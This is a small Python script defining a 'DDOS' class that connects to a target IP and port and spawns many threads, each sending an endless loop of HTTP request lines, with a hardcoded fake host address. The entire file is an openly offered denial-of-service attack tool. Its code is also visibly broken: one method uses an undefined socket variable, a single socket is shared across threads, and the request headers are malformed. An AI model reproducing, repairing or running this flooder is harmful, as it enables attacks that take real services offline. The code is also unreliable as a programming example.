		

import socket
from threading import Thread
from dataclasses import dataclass

@dataclass
class DDOS:
	# IP addres to ddos
	TARGET: str
	PORT: int = 80
	FHOST: str = '182.19.13.15'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	def ConnectToTarget(self):
		try:
			self.s.connect((self.TARGET, self.PORT))
			print(f'Connected to {self.TARGET}')
		except: print('Connection failed!')

	def attack(self):
		self.ConnectToTarget()

		while True:
			s.sendto(f'GET /{self.TARGET} HTTP/1.1 \r\n'.encode('ascii'), (self.TARGET, self.PORT))
			s.sendto(f'HOST /{self.FHOST}\r\n\r\n'.encode('ascii'), (self.TARGET, self.PORT))
		s.close()

	def ThreadedAttack(self, REQS):
		print('DDOS INIT!')
		for i in range(REQS):
			Thread_ = Thread(target=self.attack)
			Thread_.start()

